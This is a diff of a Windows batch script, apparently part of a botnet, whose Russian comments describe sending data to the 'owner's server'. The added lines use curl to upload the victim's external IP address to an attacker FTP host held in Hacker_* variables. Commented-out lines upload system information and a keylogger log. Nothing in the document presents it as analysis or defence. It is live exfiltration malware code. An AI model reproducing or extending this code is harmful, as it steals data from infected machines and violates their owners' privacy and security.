@@ -16,7 +16,7 @@ set newname2=MyIP-%CURDATE:~8,2%%CURDATE:~3,2%%CURDATE:~0,2%_%CURTIME:~0,2%%CURT
 move /Y %PUB1%\Util\MyIp.txt %PUB1%\Util\%newname2%
 
 rem Отправка внешнего IP адреса на сервер хозяина
-curl --upload-file %PUB1%\Util\%newname2% ftp://%Hacker_User%:%Hacker_Pass%@%Hacker_host2%/webdav/
+curl --upload-file %PUB1%\Util\%newname2% ftp://%Hacker_User%:%Hacker_Pass%@%Hacker_host2%:%Hacker_port%/webdav/
 set CURDATE=
 set CURRTIME=
 set newname2=
@@ -24,5 +24,5 @@ set newname2=
 
 REM Необязательная часть ботнета
 
-rem curl --upload-file %PUB1%\Util\MySystemInfoCheck.txt ftp://%Hacker_User%:%Hacker_Pass%@%Hacker_host2%/webdav/
-rem curl --upload-file %PUB1%\Util\Klavik\klavik.txt ftp://%Hacker_User%:%Hacker_Pass%@%Hacker_host2%/webdav/
+rem curl --upload-file %PUB1%\Util\MySystemInfoCheck.txt ftp://%Hacker_User%:%Hacker_Pass%@%Hacker_host2%:%Hacker_port%/webdav/
+rem curl --upload-file %PUB1%\Util\Klavik\klavik.txt ftp://%Hacker_User%:%Hacker_Pass%@%Hacker_host2%:%Hacker_port%/webdav/
